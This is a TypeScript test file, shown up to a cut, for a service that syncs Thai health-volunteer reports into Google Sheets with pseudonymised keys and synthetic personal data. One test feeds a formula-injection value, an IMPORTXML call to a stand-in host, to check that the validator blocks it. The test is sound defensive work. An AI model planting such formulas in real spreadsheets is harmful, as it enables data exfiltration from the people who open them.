import { createHmac } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import {
  finalizeLargeDatasetCommitWithPlatform,
  finalizePreviewWithPlatform,
  previewDatasetBatchWithPlatform,
  stageLargeDatasetBatchWithPlatform,
} from './largeKeyedSyncService.ts';
import {
  createFakeSyncPlatformEnv,
  jsonHttpResponse,
  TEST_HMAC_KEY_B64,
  TEST_REF_SHEET_ID,
  TEST_REPORT_SHEET_ID,
} from './testSyncPlatform.ts';
import type { SyncPlatform } from './types.ts';

const VALID_REF_SHEET_ID = TEST_REF_SHEET_ID;
const VALID_REPORT_SHEET_ID = TEST_REPORT_SHEET_ID;
const VALID_BEARER = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.synthetic_ticket06_token_999';
const VALID_HMAC_KEY = TEST_HMAC_KEY_B64;

// Independent F010 two-step HMAC-SHA256 test vectors for VALID_HMAC_KEY
const EXPECTED_RESIGNED_H1_0001 =
  'h1_94cbfd42e553f1f6601ffb2b901651695dd1ce7f0809229599e0e0ed0002125f';
const EXPECTED_RESIGNED_H1_0002 =
  'h1_fcb6128f32000892beab47f11e2a9cbb664302b88ddb1f7188cf595a3b947898';
const EXPECTED_TENURE_H1_0001 =
  'h1_66126a00e8b2fc885553b574702c7b19f069a6455edaa9d650d62ff9b528b4b0';
const EXPECTED_TENURE_H1_0002 =
  'h1_62124706588b971ec6f8d9c91f9006453c7d72e9d45537113519b5d4fbd36d47';

const createFakeReportEnv = createFakeSyncPlatformEnv;
const jsonResponse = jsonHttpResponse;

function makeResignedRow(
  index: number,
  overrides: Record<string, unknown> = {},
): Record<string, unknown> {
  const num = String(index).padStart(4, '0');
  const subCode = index % 2 === 1 ? '540601' : '540606';
  const subName = index % 2 === 1 ? 'บ้านหนุน' : 'สะเอียบ';
  const villageNum = ((index - 1) % 9) + 1;
  return {
    // 4 RESTRICTED_DEFAULT_OMIT direct personal identifiers (must NEVER leave GAS memory)
    id: `SYNTHETIC-UUID-${num}`,
    citizenId: `154060000${num}`,
    firstName: `PRIVATE_RESIGN_FIRST_${num}`,
    lastName: `PRIVATE_RESIGN_LAST_${num}`,
    // 14 ALLOW_ONLY_IF_DATASET_APPROVED columns
    retirementDate: '2024-01-15',
    retirementReason: index % 2 === 1 ? null : 'resigned',
    osmStatus: '0',
    volunteerStatus: 'already_volunteer',
    approvalStatus: 'approved',
    provinceCode: '54',
    provinceName: 'แพร่',
    districtCode: '5406',
    districtName: 'สอง',
    subdistrictCode: subCode,
    subdistrictName: subName,
    villageCode: `${subCode}${String(villageNum).padStart(3, '0')}`,
    villageNo: String(villageNum),
    villageName: index % 2 === 1 ? 'หนุนเหนือ' : 'บ้านดอนชัยสักทอง',
    ...overrides,
  };
}

function makeTenureRow(
  index: number,
  overrides: Record<string, unknown> = {},
): Record<string, unknown> {
  const num = String(index).padStart(4, '0');
  const subCode = index % 2 === 1 ? '540601' : '540605';
  const subName = index % 2 === 1 ? 'บ้านหนุน' : 'หัวเมือง';
  const villageNum = ((index - 1) % 9) + 1;
  return {
    // 5 RESTRICTED_DEFAULT_OMIT direct personal identifiers (must NEVER leave GAS memory)
    id: `SYNTHETIC-UUID-${num}`,
    citizenId: `154060000${num}`,
    osmCode: `9999000000${num}`,
    firstName: `PRIVATE_TENURE_FIRST_${num}`,
    lastName: `PRIVATE_TENURE_LAST_${num}`,
    // 16 ALLOW_ONLY_IF_DATASET_APPROVED columns (7 nullable observed in F010)
    startYear: index % 2 === 1 ? null : 2545,
    tenureYears: index % 2 === 1 ? null : 24,
    osmYear: index % 2 === 1 ? null : 2545,
    approvalDate: index % 2 === 1 ? null : '2025-12-17',
    retirementDate: index % 2 === 1 ? '2026-01-02' : null,
    retirementReason: index % 2 === 1 ? 'resigned' : null,
    osmStatus: index % 2 === 1 ? null : '',
    provinceCode: '54',
    provinceName: 'แพร่',
    districtCode: '5406',
    districtName: 'สอง',
    subdistrictCode: subCode,
    subdistrictName: subName,
    villageCode: `${subCode}${String(villageNum).padStart(3, '0')}`,
    villageNo: String(villageNum),
    villageName: index % 2 === 1 ? 'หนุนเหนือ' : 'ดงเจริญ',
    ...overrides,
  };
}

function makeReportPage(
  allRows: Record<string, unknown>[],
  page: number,
  pageSize: number,
  totalOverride?: number,
) {
  const total = totalOverride ?? allRows.length;
  const start = (page - 1) * pageSize;
  return {
    success: true,
    message: 'Success',
    items: allRows.slice(start, start + pageSize),
    total,
    page,
    pageSize,
  };
}

// Helper to run multi-batch preview + finalize for any large keyed endpoint in tests
function runFullBatchedPreview(
  endpoint: 'resigned-volunteers' | 'volunteer-tenure',
  platform: SyncPlatform,
  pageSize = 2,
  batchPages = 1,
) {
  const allDigests: Array<{
    key: string;
    rowDigest: string;
    reviewReasons?: Array<
      'MISSING_IN_SOURCE' | 'LOCALITY_MISMATCH' | 'PLACEHOLDER_COORDS' | 'SMALL_CELL_SUPPRESSED'
    >;
  }> = [];
  const allAggs: Array<{
    groupCode: string;
    groupLabel: string;
    rowCount: number;
    reviewCount: number;
  }> = [];
  const allSamples: Array<{
    sourceKey: string;
    rowDigest: string;
    scopeLabel: string;
    minimizedAttributes: Array<{ field: string; value: string | null }>;
    reviewReasons: Array<
      'MISSING_IN_SOURCE' | 'LOCALITY_MISMATCH' | 'PLACEHOLDER_COORDS' | 'SMALL_CELL_SUPPRESSED'
    >;
  }> = [];
  let nextPage: number | null = 1;
  let sourceTotal = 0;
  let pagesFetched = 0;

  while (nextPage !== null) {
    const batchRes = previewDatasetBatchWithPlatform(
      {
        endpoint,
        token: VALID_BEARER,
        startPage: nextPage,
        batchPages,
        pageSize,
        expectedSourceTotal: sourceTotal > 0 ? sourceTotal : undefined,
      },
      platform,
    );
    if (!batchRes.ok) throw new Error(`Batch RPC error: ${JSON.stringify(batchRes)}`);
    if (batchRes.data.status !== 'BATCH_OK') {
      return { blockedBatch: batchRes.data, preview: null };
    }
    sourceTotal = batchRes.data.sourceTotal;
    pagesFetched += batchRes.data.pagesFetchedInBatch;
    allDigests.push(...batchRes.data.rowDigests);
    allAggs.push(...batchRes.data.aggregateSummary);
    allSamples.push(...batchRes.data.sampleCandidates);
    nextPage = batchRes.data.hasMore ? batchRes.data.nextPage : null;
  }

  const preview = finalizePreviewWithPlatform(
    {
      endpoint,
      sourceTotal,
      pagesFetched,
      rowDigests: allDigests,
      aggregateSummary: allAggs,
      sampleCandidates: allSamples,
    },
    platform,
  );
  return { blockedBatch: null, preview };
}

describe('Resigned Volunteers & Volunteer Tenure Sync (Backend GAS RPC Seam)', () => {
  it('resigned-volunteers: fetches sequentially via report pagination with exact dual locality query params, derives byte-for-byte F010 h1_ pseudonyms, omits all 4 restricted PII fields, applies Preserve Source Locality (LOCALITY_MISMATCH -> REVIEW), detects RResign_* legacy snapshot, and writes zero Sheets during Preview', async () => {
    const rows = [
      makeResignedRow(1, { retirementReason: null }),
      makeResignedRow(2, {
        retirementReason: 'died',
        subdistrictCode: '540210',
        subdistrictName: 'ตำบลเดิมจากต้นทาง',
        villageCode: '540603006',
        villageNo: '6',
      }),
      makeResignedRow(3, {
        retirementReason: 'resigned',
        subdistrictCode: '540601',
        subdistrictName: 'บ้านหนุน',
        villageCode: '540303004',
        villageNo: '10',
      }),
    ];

    const env = createFakeReportEnv({
      workbooks: {
        [VALID_REF_SHEET_ID]: {
          name: 'ThaiPHC Reference',
          initialSheets: [{ name: 'ชีต1', rows: [['keep-ref']] }],
        },
        [VALID_REPORT_SHEET_ID]: {
          name: 'ThaiPHC Reports',
          initialSheets: [
            { name: 'ชีต1', rows: [['keep-report']] },
            {
              name: '_ThaiPHCReportCurrent',
              rows: [
                ['endpoint', 'run_id', 'snapshot_sheet', 'row_count', 'manifest_digest'],
                [
                  'resigned-volunteers',
                  'f010_20261119',
                  'RResign_f010_20261119',
                  1152,
                  'b'.repeat(64),
                ],
              ],
            },
            { name: 'RResign_f010_20261119', rows: [['legacy-header']] },
          ],
        },
      },
      fetchHandler: (url) => {
        const parsed = new URL(url);
        const page = Number(parsed.searchParams.get('page'));
        const pageSize = Number(parsed.searchParams.get('pageSize'));
        return jsonResponse(makeReportPage(rows, page, pageSize));
      },
    });

    // Multi-batch sequential fetch: pageSize=2, batchPages=1 -> batch 1 (page 1) + batch 2 (page 2)
    const batch1 = previewDatasetBatchWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        token: VALID_BEARER,
        startPage: 1,
        batchPages: 1,
        pageSize: 2,
      },
      env.platform,
    );
    expect(batch1.ok).toBe(true);
    if (!batch1.ok || batch1.data.status !== 'BATCH_OK') {
      throw new Error(`Expected BATCH_OK for batch 1, got ${JSON.stringify(batch1)}`);
    }
    expect(batch1.data.hasMore).toBe(true);
    expect(batch1.data.nextPage).toBe(2);
    expect(batch1.data.totalPages).toBe(2);
    expect(batch1.data.sourceTotal).toBe(3);

    const batch2 = previewDatasetBatchWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        token: VALID_BEARER,
        startPage: 2,
        batchPages: 1,
        pageSize: 2,
        expectedSourceTotal: batch1.data.sourceTotal,
      },
      env.platform,
    );
    expect(batch2.ok).toBe(true);
    if (!batch2.ok || batch2.data.status !== 'BATCH_OK') {
      throw new Error(`Expected BATCH_OK for batch 2, got ${JSON.stringify(batch2)}`);
    }
    expect(batch2.data.hasMore).toBe(false);
    expect(batch2.data.nextPage).toBeNull();

    // Verify exact observed ThaiPHC report URL & dual query params + GET / followRedirects:false
    expect(env.fetchCalls).toHaveLength(2);
    expect(env.fetchCalls[0].url).toBe(
      'https://api-thaiphc.hss.moph.go.th/api/v1/reports/resigned-volunteers?page=1&pageSize=2&provinceCode=54&districtCode=5406&province=54&district=5406',
    );
    expect(env.fetchCalls[1].url).toBe(
      'https://api-thaiphc.hss.moph.go.th/api/v1/reports/resigned-volunteers?page=2&pageSize=2&provinceCode=54&districtCode=5406&province=54&district=5406',
    );
    for (const call of env.fetchCalls) {
      expect(call.options.method).toBe('get');
      expect(call.options.followRedirects).toBe(false);
      expect(call.options.muteHttpExceptions).toBe(true);
    }

    // Verify byte-for-byte F010 h1_ parity against both independent literals AND legacy projection
    const allDigests = [...batch1.data.rowDigests, ...batch2.data.rowDigests];
    expect(allDigests[0].key).toBe(EXPECTED_RESIGNED_H1_0001);
    expect(allDigests[1].key).toBe(EXPECTED_RESIGNED_H1_0002);

    const legacyUrl = new URL('../../src/sync/extended-minimized-projection.mjs', import.meta.url)
      .href;
    const legacyMod = (await import(legacyUrl)) as {
      projectMinimizedExtendedSnapshot: (args: {
        endpoint: string;
        pages: unknown[];
        manifest: unknown;
        privacyKeyB64: string;
        runId: string;
      }) => { rows: Array<{ key: string }> };
    };
    const manifest = JSON.parse(
      readFileSync(new URL('../../docs/sheets-schema.json', import.meta.url), 'utf8'),
    );
    const derivedKeyB64 = createHmac('sha256', Buffer.from(VALID_HMAC_KEY, 'base64'))
      .update('THAIPHC_F010_PSEUDONYM_DERIVE_5406', 'utf8')
      .digest('base64');
    const legacyOut = legacyMod.projectMinimizedExtendedSnapshot({
      endpoint: 'resigned-volunteers',
      manifest,
      privacyKeyB64: derivedKeyB64,
      runId: 'f010_resign_parity_1',
      pages: [makeReportPage(rows, 1, 10)],
    });
    expect(allDigests.map((d) => d.key)).toEqual(legacyOut.rows.map((r) => r.key));

    // Finalize read-only preview
    const previewRes = finalizePreviewWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        sourceTotal: batch1.data.sourceTotal,
        pagesFetched: batch1.data.pagesFetchedInBatch + batch2.data.pagesFetchedInBatch,
        rowDigests: allDigests,
        aggregateSummary: [...batch1.data.aggregateSummary, ...batch2.data.aggregateSummary],
        sampleCandidates: [...batch1.data.sampleCandidates, ...batch2.data.sampleCandidates],
      },
      env.platform,
    );
    expect(previewRes.ok).toBe(true);
    if (!previewRes.ok || previewRes.data.status !== 'READY') {
      throw new Error(`Expected READY preview, got ${JSON.stringify(previewRes)}`);
    }
    expect(previewRes.data.previewMode).toBe('EXTENDED_MINIMIZED');
    expect(previewRes.data.destinationTab).toBe('ResignedVolunteers');
    expect(previewRes.data.paginationProtocol).toBe('report');
    expect(previewRes.data.counts).toEqual({ insert: 3, update: 0, unchanged: 0, review: 2 });
    expect(previewRes.data.reviewBreakdown).toEqual({ LOCALITY_MISMATCH: 2 });
    expect(previewRes.data.legacySnapshotPresent).toBe(true);
    expect(previewRes.data.legacySnapshotTab).toBe('RResign_f010_20261119');

    if (previewRes.data.previewMode !== 'EXTENDED_MINIMIZED') {
      throw new Error('Expected EXTENDED_MINIMIZED');
    }
    // Preserve Source Locality rows surface under REVIEW with unaltered locality codes
    const localitySamples = previewRes.data.sampleRows.filter((r) =>
      r.reviewReasons.includes('LOCALITY_MISMATCH'),
    );
    expect(localitySamples).toHaveLength(2);
    expect(localitySamples[0].scopeLabel).toContain('540210');
    expect(localitySamples[0].scopeLabel).toContain('540603006');
    expect(localitySamples[1].scopeLabel).toContain('540303004');
    // Nullable retirementReason=null is surfaced cleanly as null
    const nullReasonSample = previewRes.data.sampleRows.find(
      (r) => r.sourceKey === EXPECTED_RESIGNED_H1_0001,
    );
    expect(nullReasonSample?.minimizedAttributes).toContainEqual({
      field: 'retirementReason',
      value: null,
    });

    // Zero raw PII and zero HMAC secret in any preview response
    const serialized = JSON.stringify({ batch1, batch2, previewRes });
    expect(serialized).not.toMatch(
      /PRIVATE_RESIGN_FIRST|PRIVATE_RESIGN_LAST|1540600000001|SYNTHETIC-UUID-0001/,
    );
    expect(serialized).not.toContain(VALID_HMAC_KEY);
    expect(serialized).not.toContain(VALID_BEARER);

    // Zero Google Sheets writes during Preview
    expect(env.getFlushCount()).toBe(0);
    const reportWb = env.workbookStates.get(VALID_REPORT_SHEET_ID)!;
    expect(reportWb.sheetOrder).toEqual(['ชีต1', '_ThaiPHCReportCurrent', 'RResign_f010_20261119']);
  });

  it('resigned-volunteers: hard-blocks out-of-district/province scope, unexpected fields, type changes, duplicate keys, and formula injection even on Preserve Source Locality columns', () => {
    const cases: Array<{
      label: string;
      rows: Record<string, unknown>[];
      expectedCode: string;
    }> = [
      {
        label: 'wrong provinceCode',
        rows: [makeResignedRow(1, { provinceCode: '53' })],
        expectedCode: 'OUT_OF_GEOGRAPHIC_SCOPE',
      },
      {
        label: 'wrong districtCode',
        rows: [makeResignedRow(1, { districtCode: '5403' })],
        expectedCode: 'OUT_OF_GEOGRAPHIC_SCOPE',
      },
      {
        label: 'unexpected source field (never echoed)',
        rows: [makeResignedRow(1, { SECRET_EXTRA_FIELD: 'SECRET_VAL' })],
        expectedCode: 'UNEXPECTED_FIELD',
      },
      {
        label: 'type mismatch on retirementDate (null not allowed)',
        rows: [makeResignedRow(1, { retirementDate: null })],
        expectedCode: 'TYPE_MISMATCH',
      },
      {
        label: 'type mismatch on osmStatus (number instead of string)',
        rows: [makeResignedRow(1, { osmStatus: 0 })],
        expectedCode: 'TYPE_MISMATCH',
      },
      {
        label: 'duplicate key within batch',
        rows: [
          makeResignedRow(1, { id: 'DUP-RESIGN-UUID' }),
          makeResignedRow(2, { id: 'DUP-RESIGN-UUID' }),
        ],
        expectedCode: 'DUPLICATE_SOURCE_KEY',
      },
      {
        label: 'formula injection in preserved subdistrictCode',
        rows: [makeResignedRow(1, { subdistrictCode: '=IMPORTXML("https://evil.test","/")' })],
        expectedCode: 'FORMULA_INJECTION_DETECTED',
      },
    ];

    for (const tc of cases) {
      const env = createFakeReportEnv({
        fetchHandler: () => jsonResponse(makeReportPage(tc.rows, 1, 10)),
      });
      const res = previewDatasetBatchWithPlatform(
        {
          endpoint: 'resigned-volunteers',
          token: VALID_BEARER,
          startPage: 1,
          batchPages: 1,
          pageSize: 10,
        },
        env.platform,
      );
      expect(res.ok, tc.label).toBe(true);
      if (!res.ok) throw new Error(tc.label);
      expect(res.data.status, tc.label).toBe('STOP_BLOCKED');
      if (res.data.status === 'STOP_BLOCKED') {
        expect(res.data.diagnostics[0]?.code, tc.label).toBe(tc.expectedCode);
        expect(JSON.stringify(res.data)).not.toMatch(/SECRET_EXTRA_FIELD|SECRET_VAL/);
      }
    }
  });

  it('resigned-volunteers: commits multi-batch via hidden _Stage_resigned-volunteers_* preserving original locality values unaltered with _quality_status=WARNING on LOCALITY_MISMATCH, preserves legacy RResign_* & ชีต1, cleans _Stage_* after readback, and performs repeatable Keyed Upsert (INSERT/UPDATE/UNCHANGED/MISSING_IN_SOURCE)', () => {
    let sourceRows: Record<string, unknown>[] = [
      makeResignedRow(1, { retirementReason: null }),
      makeResignedRow(2, {
        retirementReason: 'died',
        subdistrictCode: '540210',
        subdistrictName: 'ตำบลเดิมจากต้นทาง',
        villageCode: '540603006',
        villageNo: '6',
      }),
      makeResignedRow(3, {
        retirementReason: 'resigned',
        subdistrictCode: '540601',
        subdistrictName: 'บ้านหนุน',
        villageCode: '540303004',
        villageNo: '10',
      }),
    ];

    const env = createFakeReportEnv({
      workbooks: {
        [VALID_REF_SHEET_ID]: {
          name: 'ThaiPHC Reference',
          initialSheets: [{ name: 'ชีต1', rows: [['keep-ref']] }],
        },
        [VALID_REPORT_SHEET_ID]: {
          name: 'ThaiPHC Reports',
          initialSheets: [
            { name: 'ชีต1', rows: [['keep-report']] },
            {
              name: '_ThaiPHCReportCurrent',
              rows: [
                ['endpoint', 'run_id', 'snapshot_sheet', 'row_count', 'manifest_digest'],
                [
                  'resigned-volunteers',
                  'f010_20261119',
                  'RResign_f010_20261119',
                  1152,
                  'b'.repeat(64),
                ],
              ],
            },
            { name: 'RResign_f010_20261119', rows: [['legacy-keep']] },
          ],
        },
      },
      fetchHandler: (url) => {
        const parsed = new URL(url);
        const page = Number(parsed.searchParams.get('page'));
        const pageSize = Number(parsed.searchParams.get('pageSize'));
        return jsonResponse(makeReportPage(sourceRows, page, pageSize));
      },
    });

    // Run 1: Initial Keyed Upsert (3 rows across 2 staging batches)
    const run1Preview = runFullBatchedPreview('resigned-volunteers', env.platform, 2, 1);
    if (
      !run1Preview.preview ||
      !run1Preview.preview.ok ||
      run1Preview.preview.data.status !== 'READY'
    ) {
      throw new Error(`Expected READY preview run 1, got ${JSON.stringify(run1Preview)}`);
    }
    const fp1 = run1Preview.preview.data.fingerprint;
    expect(fp1.counts).toEqual({ insert: 3, update: 0, unchanged: 0, review: 2 });

    const stage1 = stageLargeDatasetBatchWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        token: VALID_BEARER,
        expectedFingerprint: fp1,
        startPage: 1,
        batchPages: 1,
        pageSize: 2,
      },
      env.platform,
    );
    expect(stage1.ok).toBe(true);
    if (!stage1.ok || stage1.data.status !== 'BATCH_STAGED') {
      throw new Error(`Expected BATCH_STAGED batch 1, got ${JSON.stringify(stage1)}`);
    }
    const stageTabName = stage1.data.stagingTabName;
    const reportWb = env.workbookStates.get(VALID_REPORT_SHEET_ID)!;
    expect(stageTabName).toMatch(/^_Stage_resigned-volunteers_/);
    expect(reportWb.sheets.get(stageTabName)?.hidden).toBe(true);
    expect(reportWb.sheets.has('ResignedVolunteers')).toBe(false);

    const stage2 = stageLargeDatasetBatchWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        token: VALID_BEARER,
        expectedFingerprint: fp1,
        runId: stage1.data.runId,
        startPage: 2,
        batchPages: 1,
        pageSize: 2,
      },
      env.platform,
    );
    expect(stage2.ok).toBe(true);
    if (!stage2.ok || stage2.data.status !== 'BATCH_STAGED') {
      throw new Error(`Expected BATCH_STAGED batch 2, got ${JSON.stringify(stage2)}`);
    }
    expect(stage2.data.hasMore).toBe(false);

    const commit1 = finalizeLargeDatasetCommitWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        expectedFingerprint: fp1,
        runId: stage1.data.runId,
      },
      env.platform,
    );
    expect(commit1.ok).toBe(true);
    if (!commit1.ok || commit1.data.status !== 'COMMITTED_VERIFIED') {
      throw new Error(`Expected COMMITTED_VERIFIED run 1, got ${JSON.stringify(commit1)}`);
    }
    expect(commit1.data.counts).toEqual({ insert: 3, update: 0, unchanged: 0, review: 2 });
    expect(commit1.data.readback.verified).toBe(true);
    expect(commit1.data.readback.expectedRowCount).toBe(3);
    expect(commit1.data.readback.actualRowCount).toBe(3);
    expect(commit1.data.readback.stagingTabCleaned).toBe(true);

    // Hidden staging tab cleaned after readback; legacy RResign_* & ชีต1 preserved untouched
    expect(reportWb.sheets.has(stageTabName)).toBe(false);
    expect(reportWb.sheets.get('RResign_f010_20261119')?.rows).toEqual([['legacy-keep']]);
    expect(reportWb.sheets.get('ชีต1')?.rows).toEqual([['keep-report']]);

    // Verify ResignedVolunteers schema (14 approved + 8 uniform metadata = 22 columns)
    const destSheet = reportWb.sheets.get('ResignedVolunteers')!;
    expect(destSheet.rows[0]).toEqual([
      'retirementDate',
      'retirementReason',
      'osmStatus',
      'volunteerStatus',
      'approvalStatus',
      'provinceCode',
      'provinceName',
      'districtCode',
      'districtName',
      'subdistrictCode',
      'subdistrictName',
      'villageCode',
      'villageNo',
      'villageName',
      '_schema_version',
      '_sync_run_id',
      '_source_key',
      '_fetched_at_utc',
      '_quality_status',
      '_field_presence_json',
      '_last_seen_run_id',
      '_row_digest',
    ]);
    // Row 1 (normal, retirementReason=null): _quality_status='VALID', retirementReason='' with presence NULL
    expect(destSheet.rows[1][1]).toBe('');
    expect(destSheet.rows[1][16]).toBe(EXPECTED_RESIGNED_H1_0001);
    expect(destSheet.rows[1][18]).toBe('VALID');
    expect(JSON.parse(String(destSheet.rows[1][19])).retirementReason).toBe('NULL');
    // Row 2 (Preserve Source Locality mismatch): subdistrictCode='540210', villageCode='540603006', villageNo='6' UNALTERED + _quality_status='WARNING'
    expect(destSheet.rows[2][9]).toBe('540210');
    expect(destSheet.rows[2][11]).toBe('540603006');
    expect(destSheet.rows[2][12]).toBe('6');
    expect(destSheet.rows[2][16]).toBe(EXPECTED_RESIGNED_H1_0002);
    expect(destSheet.rows[2][18]).toBe('WARNING');
    // Row 3 (Preserve Source Locality mismatch): villageCode='540303004', villageNo='10' UNALTERED + _quality_status='WARNING'
    expect(destSheet.rows[3][11]).toBe('540303004');
    expect(destSheet.rows[3][12]).toBe('10');
    expect(destSheet.rows[3][18]).toBe('WARNING');

    // Sync log recorded exact counts (including review=2)
    const syncLog = reportWb.sheets.get('_ThaiPHCSyncLog')!;
    expect(syncLog.rows[1][3]).toBe('resigned-volunteers');
    expect(syncLog.rows[1][5]).toBe('COMMITTED_VERIFIED');
    expect(syncLog.rows[1][7]).toBe(3); // inserted
    expect(syncLog.rows[1][10]).toBe(2); // review
    expect(syncLog.rows[1][11]).toBe(true); // readback_verified

    // Run 2: Repeatable sync — row 1 UPDATED (retirementReason null -> 'resigned'), row 2 UNCHANGED (still LOCALITY_MISMATCH), row 3 MISSING_IN_SOURCE (must remain untouched!), row 4 INSERTED
    sourceRows = [
      makeResignedRow(1, { retirementReason: 'resigned' }),
      makeResignedRow(2, {
        retirementReason: 'died',
        subdistrictCode: '540210',
        subdistrictName: 'ตำบลเดิมจากต้นทาง',
        villageCode: '540603006',
        villageNo: '6',
      }),
      makeResignedRow(4, { retirementReason: 'died' }),
    ];

    const run2Preview = runFullBatchedPreview('resigned-volunteers', env.platform, 10, 1);
    if (
      !run2Preview.preview ||
      !run2Preview.preview.ok ||
      run2Preview.preview.data.status !== 'READY'
    ) {
      throw new Error(`Expected READY preview run 2, got ${JSON.stringify(run2Preview)}`);
    }
    expect(run2Preview.preview.data.counts).toEqual({
      insert: 1,
      update: 1,
      unchanged: 1,
      review: 2, // 1 LOCALITY_MISMATCH (row 2) + 1 MISSING_IN_SOURCE (row 3)
    });
    expect(run2Preview.preview.data.reviewBreakdown).toEqual({
      LOCALITY_MISMATCH: 1,
      MISSING_IN_SOURCE: 1,
    });
    // Legacy notice turns OFF once fixed ResignedVolunteers tab exists
    expect(run2Preview.preview.data.legacySnapshotPresent).toBe(false);

    const run2Stage = stageLargeDatasetBatchWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        token: VALID_BEARER,
        expectedFingerprint: run2Preview.preview.data.fingerprint,
        startPage: 1,
        batchPages: 1,
        pageSize: 10,
      },
      env.platform,
    );
    if (!run2Stage.ok || run2Stage.data.status !== 'BATCH_STAGED') {
      throw new Error(`Expected BATCH_STAGED run 2, got ${JSON.stringify(run2Stage)}`);
    }
    const run2Commit = finalizeLargeDatasetCommitWithPlatform(
      {
        endpoint: 'resigned-volunteers',
        expectedFingerprint: run2Preview.preview.data.fingerprint,
        runId: run2Stage.data.runId,
      },
      env.platform,
    );
    expect(run2Commit.ok).toBe(true);
    if (!run2Commit.ok || run2Commit.data.status !== 'COMMITTED_VERIFIED') {
      throw new Error(`Expected COMMITTED_VERIFIED run 2, got ${JSON.stringify(run2Commit)}`);
    }
    // 3 existing rows + 1 inserted = 4 total rows (row 3 MISSING_IN_SOURCE preserved, never auto-deleted!)
    expect(run2Commit.data.readback.expectedRowCount).toBe(4);
    expect(run2Commit.data.readback.actualRowCount).toBe(4);
    expect(destSheet.rows).toHaveLength(5); // header + 4 rows
    expect(destSheet.rows[1][1]).toBe('resigned'); // updated in place
    expect(destSheet.rows[3][11]).toBe('540303004'); // row 3 preserved untouched
  });

  it('volunteer-tenure: fetches sequentially via report pagination with exact dual locality query params, honors all 7 observed F010 nullable fields (0 vs null, empty string vs null), derives byte-for-byte F010 h1_ pseudonyms, strips all 5 restricted PII fields, and detects RTenure_* legacy snapshot', async () => {
    const rows = [
      makeTenureRow(1, {
        startYear: null,
        tenureYears: null,
        osmYear: null,
        approvalDate: null,
        retirementDate: '2026-01-02',
        retirementReason: 'resigned',
        osmStatus: null,
      }),
      makeTenureRow(2, {
        startYear: 2569,
        tenureYears: 0,
        osmYear: 2569,
        approvalDate: '2025-12-17',
        retirementDate: null,
        retirementReason: null,
        osmStatus: '',
      }),
      makeTenureRow(3, {
        startYear: 2545,
        tenureYears: 24,
        osmYear: 2545,
        approvalDate: '2025-12-17',
        retirementDate: null,
        retirementReason: null,
        osmStatus: '1',
      }),
    ];

    const env = createFakeReportEnv({
      workbooks: {
        [VALID_REF_SHEET_ID]: {
          name: 'ThaiPHC Reference',
          initialSheets: [{ name: 'ชีต1', rows: [['keep-ref']] }],
        },
        [VALID_REPORT_SHEET_ID]: {
          name: 'ThaiPHC Reports',
          initialSheets: [
            { name: 'ชีต1', rows: [['keep-report']] },
            {
              name: '_ThaiPHCReportCurrent',
              rows: [
                ['endpoint', 'run_id', 'snapshot_sheet', 'row_count', 'manifest_digest'],
                [
                  'volunteer-tenure',
                  'f010_20261119',
                  'RTenure_f010_20261119',
                  1571,
                  'c'.repeat(64),
                ],
              ],
            },
            { name: 'RTenure_f010_20261119', rows: [['legacy-tenure-keep']] },
          ],
        },
      },
      fetchHandler: (url) => {
        const parsed = new URL(url);
        const page = Number(parsed.searchParams.get('page'));
        const pageSize = Number(parsed.searchParams.get('pageSize'));
        return jsonResponse(makeReportPage(rows, page, pageSize));
      },
    });

    const batch1 = previewDatasetBatchWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        token: VALID_BEARER,
        startPage: 1,
        batchPages: 1,
        pageSize: 2,
      },
      env.platform,
    );
    expect(batch1.ok).toBe(true);
    if (!batch1.ok || batch1.data.status !== 'BATCH_OK') {
      throw new Error(`Expected BATCH_OK for tenure batch 1, got ${JSON.stringify(batch1)}`);
    }

    const batch2 = previewDatasetBatchWithPlatform(
      {
        endpoint: 'volunteer-tenure',
        token: VALID_BEARER,
        startPage: 2,
        batchPages: 1,
        pageSize: 2,
        expectedSourceTotal: batch1.data.sourceTotal,
      },
      env.platform,
    );
    expect(batch2.ok).toBe(true);
    if (!batch2.ok || batch2.data.status !== 'BATCH_OK') {
      throw new Error(`Expected BATCH_OK for tenure batch 2, got ${JSON.stringify(batch2)}`);
    }

    expect(env.fetchCalls[0].url).toBe(
      'https://api-thaiphc.hss.moph.go.th/api/v1/reports/volunteer-tenure?page=1&pageSize=2&provinceCode=54&districtCode=5406&province=54&district=5406',
    );
    expect(env.fetchCalls[1].url).toBe(
      'https://api-thaiphc.hss.moph.go.th/api/v1/reports/volunteer-tenure?page=2&pageSize=2&provinceCode=54&districtCode=5406&province=54&district=5406',
    );

    const allDigests = [...batch1.data.rowDigests, ...batch2.data.rowDigests];
    expect(allDigests[0].key).toBe(EXPECTED_TENURE_H1_0001);
    expect(allDigests[1].key).toBe(EXPECTED_TENURE_H1_0002);
    // Domain separation: identical raw UUID produces distinct h1_ keys across endpoints
    expect(EXPECTED_TENURE_H1_0001).not.toBe(EXPECTED_RESIGNED_H1_0001);

    const legacyUrl = new URL('../../src/sync/extended-minimized-projection.mjs', import.meta.url)
      .href;
    const legacyMod = (await import(legacyUrl)) as {
      projectMinimizedExtendedSnapshot: (args: {
        endpoint: string;
        pages: unknown[];
        manifest: unknown;
        privacyKeyB64: string;
        runId: string;
      }) => { rows: Array<{ key: string }> };
    };
    const manifest = JSON.parse(
      readFileSync(new URL('../../docs/sheets-schema.json', import.meta.url), 'utf8'),
    );
    const derivedKeyB64 = createHmac('sha256', Buffer.from(VALID_HMAC_KEY, 'base64'))
      .update('THAIPHC_F010_PSEUDONYM_DERIVE_5406', 'utf8')
      .digest('base64');
    const legacyOut = legacyMod.projectMinimizedExtendedSnapshot({
      endpoint: 'volunteer-tenure',
      manifest,
      privacyKeyB64: derivedKeyB64,
      runId: 'f010_tenure_parity_1',
      pages: [makeReportPage(rows, 1, 10)],
    });
    expect(allDigests.map((d) => d.key)).toEqual(legacyOut.rows.map((r) => r.key));

    // Simulate GAS google.script.run stripping `null` object properties on client->server args
    const wireCandidates = [...batch1.data.sampleCandidates, ...batch2.data.sampleCandidates].map(
      (cand) => ({
        ...cand,
